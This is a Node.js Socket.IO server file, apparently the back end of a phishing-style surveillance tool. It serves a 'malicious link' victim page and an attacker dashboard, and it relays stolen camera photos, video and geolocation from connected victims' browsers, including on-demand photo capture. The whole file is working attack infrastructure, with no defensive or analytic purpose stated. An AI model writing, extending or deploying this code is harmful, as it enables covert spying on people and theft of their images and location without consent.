const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" }
});

app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Store connected victims
let victims = new Map();

io.on('connection', (socket) => {
    console.log('🎯 Victim connected:', socket.id);
    victims.set(socket.id, { socket, lastPhoto: null });
    
    // Victim sends photo
    socket.on('steal_photo', (data) => {
        console.log('📸 Photo received from:', socket.id);
        io.to('dashboard').emit('new_photo', { 
            ...data, 
            victimId: socket.id,
            timestamp: new Date().toISOString()
        });
    });
    
    socket.on('steal_video', (data) => {
        console.log('🎥 Video received from:', socket.id);
        io.to('dashboard').emit('new_video', data);
    });
    
    socket.on('steal_location', (data) => {
        console.log('📍 Location:', data.lat, data.lng);
        io.to('dashboard').emit('new_location', data);
    });
    
    socket.on('disconnect', () => {
        console.log('💀 Victim disconnected:', socket.id);
        victims.delete(socket.id);
    });
});

// Attacker dashboard - socket joins a room
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Malicious link - victim page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'victim.html'));
});

// API for dashboard to request photo
app.post('/request-photo/:victimId', (req, res) => {
    const victimId = req.params.victimId;
    const victim = victims.get(victimId);
    if (victim) {
        victim.socket.emit('request_photo');
        res.json({ success: true });
    } else {
        res.json({ success: false, error: 'Victim not found' });
    }
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🔴 SERVER RUNNING on port ${PORT}`);
    console.log(`📱 Victim link: http://localhost:${PORT}`);
    console.log(`🕹️ Dashboard: http://localhost:${PORT}/dashboard`);
});
